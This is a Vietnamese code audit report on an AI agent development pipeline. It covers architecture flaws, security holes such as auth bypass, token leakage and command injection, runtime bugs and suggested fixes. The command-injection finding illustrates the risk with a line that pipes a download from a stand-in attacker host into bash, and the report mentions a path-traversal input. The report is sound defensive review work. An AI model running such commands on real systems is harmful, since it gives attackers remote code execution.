# Audit Report v2 — AI Dev Pipeline
> Góc nhìn: Architecture + Code Review + Debug
> Ngày: 2026-04-05 | Đọc toàn bộ source code thực tế

---

## TỔNG QUAN

| Hạng mục | Điểm | Nhận xét |
|----------|------|----------|
| Architecture | 6.5/10 | Core pattern tốt, nhưng God Class nghiêm trọng |
| Security | 5.5/10 | Auth bypass + token leak + command injection |
| Code Correctness | 7/10 | Logic chắc, nhưng có 2 runtime bugs thực sự |
| Error Handling | 7.5/10 | Recovery flow tốt, lock management khá tốt |
| Maintainability | 5/10 | pipelineRunner.js 1887 lines — khó maintain |
| Reliability | 7/10 | StateMachine chưa dùng, orphan processes |

---

## PHẦN 1 — ARCHITECTURE REVIEW (ADR-style)

### ADR-AUD-01: God Class — `pipelineRunner.js` (1887 lines)

**Status:** Critical — Cần refactor ngay

**Vấn đề:**
File `pipelineRunner.js` chứa **15+ methods** thuộc nhiều concerns hoàn toàn khác nhau:

```
PipelineRunner (1887 lines):
├── Sprint flow:        _step0 → _step5, runMerge
├── Task execution:     _executeTask, _escalateTask, retryTask
├── DevOps:            runLocalSetup, runUATDeploy
├── Bugfix pipeline:    runBugfix (3 agents)
├── QA fixes:          runQAFix
├── Integration:        _step4b_IntegrationVerify
└── Format helpers:     formatReceptionForPO, formatArchitectForPO,
                        formatFeatureSpecsForPO, formatTasksForPO,
                        formatQAForPO, formatQALayer1FailForPO,
                        formatQALayer2FailForPO, extractJSONFromNotes
```

**Impact:** Khi có bug ở step 5, developer phải scroll qua 700 lines code DevOps không liên quan. Mọi unit test phải import toàn bộ class. Merge conflicts xảy ra thường xuyên khi nhiều người cùng sửa.

**Đề xuất refactor:**
```
services/orchestrator/
├── PipelineRunner.js      (core sprint flow — steps 0-6)
├── TaskExecutor.js        (task dev + review loop)
├── QARunner.js            (3-layer QA + QA fix)
├── BugfixRunner.js        (3-agent bugfix pipeline)
├── DeployRunner.js        (runLocalSetup + runUATDeploy)
├── IntegrationVerifier.js (_step4b)
└── formatters/
    ├── receptionFormatter.js
    ├── architectFormatter.js
    └── qaFormatter.js
```

---

### ADR-AUD-02: `GATE_TO_STEP` Duplicate

**Status:** Major — Dễ sửa, nguy hiểm nếu không sửa

**Vấn đề:**
`GATE_TO_STEP` được định nghĩa ở **2 nơi**:
- `src/lib/constants.js` line 38-46
- `src/services/orchestrator/stateMachine.js` line 30-38

`orchestrator/index.js` import từ `stateMachine.js`. `constants.js` cũng export nhưng không ai dùng bản đó.

**Risk:** Nếu 2 file diverge (ai đó update 1 bên quên update bên kia) → silent routing bug, gate approval trigger sai step.

**Fix:** Xóa khỏi `stateMachine.js`, import từ `constants.js`.

---

### ADR-AUD-03: `StateMachine` class — Dead Feature

**Status:** Minor — Technical debt

**Vấn đề:**
`StateMachine` class với `TRANSITIONS` map và `assertTransition()` được định nghĩa nhưng **không bao giờ được gọi** trong codebase. Sprint transitions không bao giờ được validate.

```javascript
// stateMachine.js — DEFINED but NEVER USED:
export class StateMachine {
  canTransition(from, to) { ... }
  assertTransition(from, to) { ... }
}
```

**Consequence:** Sprint có thể transition sang bất kỳ trạng thái nào mà không bị kiểm tra. Race condition về state có thể xảy ra mà không có guardrail.

**Fix:** Gọi `assertTransition()` trong `Orchestrator.onGateApproved()` và `handleErrorAction()` trước khi update DB.

---

### ADR-AUD-04: Schema — Tất cả Status Fields là `String`

**Status:** Major — Data integrity risk

**Vấn đề:**
Tất cả status fields trong Prisma schema đều là `String`:
```prisma
model Sprint { status String @default("pending") }
model Gate   { status String @default("pending") }
model Task   { status String @default("pending") }
```

Không có enum enforcement ở DB level. Một typo như `TASK_STATUS.PASS = 'PASS'` (uppercase) vs actual value `'pass'` sẽ không bị catch.

**Fix:** Dùng Prisma native enum hoặc thêm Zod validation trong service layer trước mọi DB write.

---

### ADR-AUD-05: `extractJSONFromNotes` — Brittle Data Contract

**Status:** Major — Architecture anti-pattern

**Vấn đề:**
Pipeline chuyển data giữa steps bằng cách **embed JSON vào markdown notes của Gate**, sau đó parse lại:

```javascript
// formatArchitectForPO() — GHI dữ liệu vào notes:
parts.push(`\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``);

// extractJSONFromNotes() — ĐỌC lại:
const match = notes.match(/```json\n([\s\S]+?)\n```/);
```

Gate notes là **human-readable display format**, không phải data storage. Nếu format notes thay đổi → tất cả downstream steps break silently.

**Impact:** _step2 FeatureSpecs, _step3 AtomicTasks, _step4b Integration Verify, runMerge (breaking changes) — tất cả đều phụ thuộc vào pattern này.

**Fix Architecture:** Thêm field `structuredData JSONB?` vào model `Gate` để lưu raw parsed data riêng biệt với `notes` (display string). Đọc từ `structuredData`, hiển thị từ `notes`.

---

### ADR-AUD-06: `PipelineConfig` Singleton — Dual Source of Truth

**Status:** Minor

**Vấn đề:**
`PipelineConfig` singleton trong DB và constants trong `constants.js` đều define cùng giá trị:
```javascript
// constants.js:
export const MAX_RETRY_ROUNDS = 3;
export const CLAUDE_TIMEOUT_MS = 15 * 60 * 1000;

// PipelineConfig model:
maxRetryRounds Int @default(3)
taskTimeoutMins Int @default(45)
```

Code đôi khi dùng constants, đôi khi query DB. Nếu DB singleton chưa được tạo (fresh install) thì code fall back về constants — hai nguồn truth khác nhau.

**Fix:** Chọn một nguồn duy nhất. Hoặc seeding `PipelineConfig` bắt buộc khi `startServer()`, hoặc remove DB config và chỉ dùng constants + ENV vars.

---

## PHẦN 2 — CODE REVIEW

### CR-01: Auth Bypass khi `API_SECRET` Không Được Set ⚠️ CRITICAL

**File:** `src/middleware/auth.js:5`

```javascript
const secret = process.env.API_SECRET;
if (!secret) return next(); // Dev mode — no secret set, allow all
```

**Risk:** Nếu deploy production mà quên set `API_SECRET` env var → toàn bộ API public, không cần token. Bất kỳ ai biết URL đều có thể approve gates, trigger deploy, xem source code được managed.

**Fix:**
```javascript
const secret = process.env.API_SECRET;
if (!secret) {
  // Enforce secret in production
  if (process.env.NODE_ENV === 'production') {
    return res.status(500).json({ error: 'API_SECRET not configured' });
  }
  return next(); // Allow in dev only
}
```

---

### CR-02: Git Token Exposed trong URL và Shell ⚠️ HIGH

**File:** `pipelineRunner.js:792`

```javascript
const remoteWithToken = config.gitRemoteUrl.replace('https://', `https://${config.gitToken}@`);
await execAsync(`git remote add uat-deploy "${remoteWithToken}"`, { cwd: repoPath });
await execAsync(`git push uat-deploy ${branch} --force 2>&1`, { cwd: repoPath, timeout: 60000 });
await execAsync(`git remote remove uat-deploy`, { cwd: repoPath });
```

**Problems:**
1. Token xuất hiện trong `git remote -v`, `git config`, shell history
2. Error messages từ git có thể leak token vào logs
3. `--force` push không có guardrail

**Fix:**
```javascript
// Dùng GIT_ASKPASS hoặc credentials.helper thay vì embed trong URL
const env = { ...process.env, GIT_TOKEN: config.gitToken };
await execAsync(`git -c credential.helper='!f() { echo "password=$GIT_TOKEN"; }; f' push origin ${branch}`, { cwd: repoPath, env });
```

---

### CR-03: Command Injection via Database Config ⚠️ HIGH

**File:** `pipelineRunner.js:682-697, 808-835`

```javascript
// BAD: User-controlled strings run as shell commands
await execAsync(config.localSetupCmd, { cwd: repoPath, timeout: 120000 });
await execAsync(config.localStartCmd, { cwd: repoPath });
await execAsync(config.customDeployCmd, { cwd: repoPath });
```

**Risk:** Bất kỳ người dùng nào có thể update `DeployConfig` (qua API `/api/config`) có thể chạy arbitrary shell commands trên server. Ví dụ: `localSetupCmd: "curl attacker.com | bash"`.

**Fix:** Whitelist commands hoặc dùng `execa` với array arguments thay vì string:
```javascript
// Validate command format trước khi run
const ALLOWED_CMD_PREFIXES = ['npm', 'yarn', 'pip', 'python3', 'node'];
const cmdBase = config.localSetupCmd?.split(' ')[0];
if (!ALLOWED_CMD_PREFIXES.includes(cmdBase)) {
  throw new Error(`Disallowed setup command: ${cmdBase}`);
}
```

---

### CR-04: `architect` Zod Schema Thiếu 4 Fields Quan Trọng ⚠️ HIGH

**File:** `src/services/claude/outputParser.js:34-47`

Schema hiện tại:
```javascript
architect: z.object({
  analysis: z.string(),
  architectureOverview: z.string(),
  features: z.array(...),
  techDecisions: z.array(z.string()),
  risks: z.array(z.string()),
  masterMdUpdate: z.string(),  // ← required nhưng prompt nói "can be null"
  estimatedTasks: z.number(),
  // ← THIẾU: tcrUpdate, contextIndexUpdate, zoneClassification, breakingChanges
}),
```

**Impact:**
1. `masterMdUpdate: z.string()` required — schema warning mỗi lần Architect trả về null
2. `tcrUpdate`, `contextIndexUpdate`, `zoneClassification`, `breakingChanges` không được validated → silent data loss nếu Claude trả về wrong format

**Fix:** Cập nhật schema đầy đủ:
```javascript
architect: z.object({
  analysis: z.string(),
  architectureOverview: z.string(),
  features: z.array(...),
  techDecisions: z.array(z.string()),
  risks: z.array(z.string()),
  masterMdUpdate: z.string().nullable().optional(),
  estimatedTasks: z.number(),
  tcrUpdate: z.object({
    summary: z.string(),
    decisions: z.array(z.string()).default([]),
    filesChanged: z.array(z.string()).default([]),
    nextSprintContext: z.string().optional(),
  }).optional(),
  contextIndexUpdate: z.string().nullable().optional(),
  zoneClassification: z.object({
    frozen: z.array(z.object({ path: z.string(), reason: z.string() })).default([]),
    guarded: z.array(z.object({ path: z.string(), reason: z.string() })).default([]),
    fluid: z.string().optional(),
  }).optional(),
  breakingChanges: z.array(z.object({
    type: z.string(),
    description: z.string(),
    affectedModules: z.array(z.string()).default([]),
    migrationRequired: z.boolean().default(false),
    migrationNotes: z.string().optional(),
  })).default([]),
}),
```

---

### CR-05: `Notification` Model Thiếu Foreign Key Relation ⚠️ MEDIUM

**File:** `prisma/schema.prisma:127-143`

```prisma
model Notification {
  sprintId  String?  // ← Không có @relation — không cascade delete
  ...
}
```

**Impact:** Khi sprint bị xóa, tất cả notifications của sprint đó remain as orphaned records. Với nhiều sprints, bảng Notification phình to vô hạn.

**Fix:**
```prisma
model Notification {
  sprintId  String?
  sprint    Sprint? @relation(fields: [sprintId], references: [id], onDelete: SetNull)
}
model Sprint {
  notifications Notification[]
}
```

---

### CR-06: Thiếu `repoPath` Validation ⚠️ MEDIUM

**File:** `src/controllers/projectController.js` (không đọc được nhưng data flow đã rõ)

`project.repoPath` từ DB được dùng trực tiếp trong:
- `git` operations (WorktreeManager)
- `fs` operations (mkdir, readFile, writeFile)
- Shell commands (`find . -type f`, `npm test`)

Không có kiểm tra path traversal (`../../etc/passwd`), không validate path tồn tại trước khi spawn.

**Fix:**
```javascript
function validateRepoPath(repoPath) {
  const normalized = path.resolve(repoPath);
  const allowed = path.resolve(process.env.PROJECTS_BASE_DIR || '/home');
  if (!normalized.startsWith(allowed)) {
    throw new Error(`repoPath outside allowed base: ${normalized}`);
  }
  if (!existsSync(normalized)) {
    throw new Error(`repoPath does not exist: ${normalized}`);
  }
  return normalized;
}
```

---

### CR-07: Socket.io — Bất Kỳ Client Nào Cũng Subscribe Được Mọi Sprint ⚠️ LOW

**File:** `src/index.js:76-82`

```javascript
socket.on('subscribe:sprint', ({ sprintId }) => {
  socket.join(`sprint:${sprintId}`);  // Không validate sprintId
});
```

Client có thể đoán/enumerate sprintId (CUID format) và subscribe nhận events của sprint người khác.

---

## PHẦN 3 — DEBUG FINDINGS

### BUG-01: `_step5_QA` — QA Final Call Thiếu `cwd` ⚠️ RUNTIME BUG

**File:** `pipelineRunner.js:1644`

```javascript
// BUG: thiếu cwd!
const finalResult = await runClaudeWithRetry({
  prompt: finalPrompt,
  tools: [],
  sprintId  // ← cwd không được pass
});
```

**Impact:** QA final agent chạy trong `process.cwd()` (thư mục pipeline server) thay vì `project.repoPath`. Không crash ngay (tools: [] nên không có file access), nhưng nếu sau này final prompt cần tool thì sẽ fail.

**Fix:**
```javascript
const finalResult = await runClaudeWithRetry({
  prompt: finalPrompt,
  tools: [],
  cwd: project.repoPath,  // ← thêm dòng này
  sprintId
});
```

---

### BUG-02: QA Layer 2 — Git Diff Sai ⚠️ LOGIC BUG

**File:** `pipelineRunner.js:1553-1558`

```javascript
// Contract check dùng git diff của MAIN branch
const diffResult = await mainGit.diff([`HEAD~${Math.min(passTasks.length, 20)}`, 'HEAD']);
```

**Problem:** Đây là diff của N commits cuối trên `main`, không phải diff của task branches. Sau khi merge, main có thể có commits từ nhiều tasks lẫn lộn, và thứ tự không nhất thiết tương ứng với `passTasks.length`. Nếu sprint trước có 5 tasks và sprint này có 3 tasks, `HEAD~3` có thể include code của sprint trước.

**Fix:** Contract check nên dùng cùng approach với QA chunk — `wtManager.getDiff(task.taskId)` cho từng task, rồi concat lại:
```javascript
const diffs = [];
for (const task of passTasks) {
  const diff = await wtManager.getDiff(task.taskId);
  diffs.push(`=== ${task.taskId} ===\n${diff}`);
}
const gitDiff = diffs.join('\n\n').substring(0, 10000);
```

---

### BUG-03: Orphan Claude Subprocesses Sau Server Restart ⚠️ HIGH

**File:** `claudeService.js:9-10`

```javascript
const _activeProcesses = new Map();  // Module-level singleton
```

**Problem flow:**
1. Sprint đang chạy, Claude subprocess đang chạy
2. Server restart (crash, deploy, etc.)
3. `clearStaleLocks()` unlock `isProcessing: false` ✅
4. Nhưng Claude subprocess VẪN ĐANG CHẠY như orphan process
5. Nếu PO resume sprint → tạo thêm subprocess mới → 2 Claude instances chạy song song trên cùng worktree → git conflicts

**Fix:** Thêm process tracking vào DB thay vì in-memory Map:
```prisma
model Sprint {
  claudePid Int?  // Track subprocess PID
}
```
```javascript
// Khi start subprocess
await prisma.sprint.update({ data: { claudePid: subprocess.pid } });

// clearStaleLocks() — kill orphan processes
const stale = await prisma.sprint.findMany({ where: { isProcessing: true } });
for (const s of stale) {
  if (s.claudePid) {
    try { process.kill(s.claudePid, 'SIGTERM'); } catch {}
  }
}
```

---

### BUG-04: `pruneAll()` — Stale Feature Branches Tích Lũy ⚠️ MEDIUM

**File:** `worktreeManager.js:226-237`

```javascript
for (const branch of featBranches) {
  try {
    await this.git.branch(['-d', branch.trim()]);  // Safe delete — chỉ xóa nếu merged
  } catch {
    // Branch not fully merged — skip (SILENT)
  }
}
```

**Problem:** Tasks fail → branches không bao giờ merge vào main → `-d` throw → catch swallow → branches tích lũy. Sau 20 sprints có thể có 50+ stale `feat/*` branches.

**Fix:** Sau mỗi sprint complete, dùng `-D` force delete cho tất cả task branches của sprint đó (chúng đã được reviewed/escalated, không cần giữ):
```javascript
const sprintTasks = await prisma.task.findMany({ where: { sprintId } });
for (const task of sprintTasks) {
  if (task.branch) {
    await this.git.branch(['-D', task.branch]).catch(() => {});
  }
}
```

---

### BUG-05: `resumeSprint` — Partial Task Completion Không Đúng ⚠️ MEDIUM

**File:** `orchestrator/index.js:409-420`

```javascript
if (lastGateNum === 3) {
  const hasPending = sprint.tasks.some((t) => t.status === 'pending');
  const hasEscalated = sprint.tasks.some((t) => t.status === 'escalated');
  const allPass = sprint.tasks.length > 0 && sprint.tasks.every((t) => t.status === 'pass');

  if (allPass) { /* trigger Step 5 */ }
  if (hasEscalated && !hasPending) { /* waiting_human */ }
  // ← GÌ XẢY RA NẾU hasPending = true VÀ !allPass?
}
```

**Problem:** Nếu có `hasPending = true` và một số tasks đã `pass` (mixed state từ interrupted mid-Step 4), code fall through xuống dưới và re-run toàn bộ Step 4. Điều này sẽ tạo lại worktrees cho PENDING tasks (đúng), nhưng PASS tasks được giữ nguyên (không re-run).

Tuy nhiên, Step 4 query `WHERE status = 'pending'` → chỉ process pending tasks → behavior đúng. Nhưng **không có log rõ ràng** về việc resume từ giữa chừng, gây khó debug.

**Fix:** Thêm explicit handling + log:
```javascript
if (hasPending) {
  logger.info({ sprintId, pending: sprint.tasks.filter(t => t.status === 'pending').length },
    'Resume: re-running pending tasks');
  // continue to default re-run step 4
}
```

---

### BUG-06: `runQAFix` — Full 3-Layer QA Re-run Sau Mỗi Fix ⚠️ PERFORMANCE

**File:** `pipelineRunner.js:1455-1456`

```javascript
const freshSprint = await this._reloadSprint(sprintId);
await this._step5_QA(freshSprint);  // Full 3-layer QA!
```

**Problem:** Mỗi lần fix → chạy lại toàn bộ Layer 1 (syntax check) + Layer 2 (contract check AI) + Layer 3 (chunked QA AI) = 3+ Claude calls + automated checks. Với sprint 10 tasks, đây là 5-6 Claude calls mỗi lần fix.

**Proposed optimization:** Chỉ re-run Layer 3 (business review) sau QA fix nếu Layer 1 đã pass:
```javascript
// Sau fix — chạy Layer 1 nhanh để verify không break syntax
const quickCheck = await runSprintAutomatedChecks(project.repoPath);
if (!quickCheck.passed) {
  // Layer 1 fail sau fix → notify PO
} else {
  // Skip Layer 1+2, chỉ re-run Layer 3
  await this._step5_QA_Layer3Only(freshSprint);
}
```

---

### BUG-07: Import Validation `node -e "require(absPath)"` Dùng CJS Syntax ⚠️ MEDIUM

**File:** `validationService.js:66-68`

```javascript
const { stdout, stderr } = await execAsync(
  `node -e "require('${absPath}')" 2>&1 || true`,
  { cwd: worktreePath }
);
```

**Problem:** Projects dùng ES Modules (`"type": "module"` trong package.json) sẽ fail vì `require()` không available trong ESM. Node sẽ throw `ReferenceError: require is not defined` → check báo `MODULE_NOT_FOUND` false positive.

**Fix:**
```javascript
// Detect module type trước
const pkgPath = path.join(worktreePath, 'package.json');
const pkg = existsSync(pkgPath) ? JSON.parse(readFileSync(pkgPath)) : {};
const isESM = pkg.type === 'module' || file.endsWith('.mjs');
const importCmd = isESM
  ? `node --input-type=module -e "import('${absPath}')" 2>&1 || true`
  : `node -e "require('${absPath}')" 2>&1 || true`;
```

---

## PHẦN 4 — BUG TRACKER TỔNG HỢP

| ID | File | Loại | Mức độ | Mô tả |
|----|------|------|--------|-------|
| CR-01 | auth.js | Security | 🔴 Critical | Auth bypass khi không có API_SECRET |
| CR-02 | pipelineRunner.js | Security | 🔴 High | Git token exposed trong URL/logs |
| CR-03 | pipelineRunner.js | Security | 🔴 High | Command injection via DB config |
| CR-04 | outputParser.js | Correctness | 🟠 High | architect schema thiếu 4 fields |
| BUG-01 | pipelineRunner.js | Runtime Bug | 🟠 High | QA Final thiếu `cwd` |
| BUG-02 | pipelineRunner.js | Logic Bug | 🟠 High | Contract check dùng sai git diff |
| BUG-03 | claudeService.js | Reliability | 🟠 High | Orphan Claude processes sau restart |
| CR-05 | schema.prisma | Data | 🟡 Medium | Notification thiếu Sprint FK |
| CR-06 | projectController | Security | 🟡 Medium | Không validate repoPath |
| BUG-04 | worktreeManager.js | Resource | 🟡 Medium | Stale branches tích lũy |
| BUG-05 | orchestrator/index.js | UX | 🟡 Medium | Resume logic thiếu explicit log |
| BUG-07 | validationService.js | Correctness | 🟡 Medium | ESM vs CJS import check sai |
| AUD-02 | constants.js | Architecture | 🟡 Medium | GATE_TO_STEP duplicate |
| AUD-03 | stateMachine.js | Architecture | 🟡 Medium | StateMachine không được dùng |
| BUG-06 | pipelineRunner.js | Performance | 🟢 Low | Full QA re-run sau mỗi fix |
| CR-07 | index.js | Security | 🟢 Low | Socket subscribe không validate |
| AUD-06 | constants.js | Maintenance | 🟢 Low | Dual source of truth config |

---

## PHẦN 5 — ĐỀ XUẤT TASK THEO PRIORITY

### Priority 1 — Fix ngay (Security + Runtime bugs)

**TASK-S1:** Fix auth bypass trong `auth.js` — thêm production check
**TASK-S2:** Fix git token exposure — dùng `GIT_ASKPASS` hoặc credentials helper
**TASK-S3:** Thêm command validation cho `localSetupCmd`/`localStartCmd`/`customDeployCmd`
**TASK-B1:** Fix QA Final prompt thiếu `cwd` — 1-line fix
**TASK-B2:** Fix Contract check git diff — dùng `wtManager.getDiff()` per task

### Priority 2 — Fix trong sprint kế tiếp

**TASK-B3:** Thêm `claudePid` vào Sprint model để kill orphan processes khi restart
**TASK-S4:** Update `architect` Zod schema đầy đủ 4 fields còn thiếu
**TASK-S5:** Thêm Sprint FK vào Notification model
**TASK-B5:** Fix import validation — detect ESM vs CJS trước khi chạy `require()`
**TASK-A1:** Consolidate `GATE_TO_STEP` — xóa duplicate trong `stateMachine.js`

### Priority 3 — Refactor / Technical debt

**TASK-A2:** Tách `pipelineRunner.js` thành 5-6 classes nhỏ
**TASK-A3:** Kích hoạt `StateMachine.assertTransition()` trong Orchestrator
**TASK-A4:** Thêm `structuredData` field vào Gate model (thay thế `extractJSONFromNotes`)
**TASK-B4:** Fix `pruneAll()` — force delete task branches sau sprint complete
**TASK-A5:** Unify PipelineConfig — một nguồn truth (DB hoặc constants + ENV)

---

## ĐIỂM MẠNH CỦA HỆ THỐNG

Dù có các vấn đề trên, hệ thống có nhiều điểm thiết kế rất tốt:

1. **Atomic gate approval** — `prisma.$transaction` cho gate + isProcessing lock cùng lúc → không race condition
2. **Reviewer isolation** — `buildReviewPrompt` không nhận `devOutput`, reviewer chạy ở `project.repoPath` không phải worktree
3. **setImmediate pattern** — non-blocking response, async pipeline execution
4. **clearStaleLocks on startup** — tự recover sau crash
5. **Graceful degradation** — Integration verify fail → proceed to QA, Layer 2 fail → treat as passed
6. **AGENT_PROFILES** — agent identity isolation rõ ràng
7. **3-layer QA** — automated + contract + business review độc lập
8. **Worktree isolation** — mỗi task có git branch riêng, không share code
9. **Exponential backoff retry** — Claude retry với increasing timeout
10. **Bugfix 3-agent pipeline** — Diagnostician → Fixer → Verifier isolation pattern
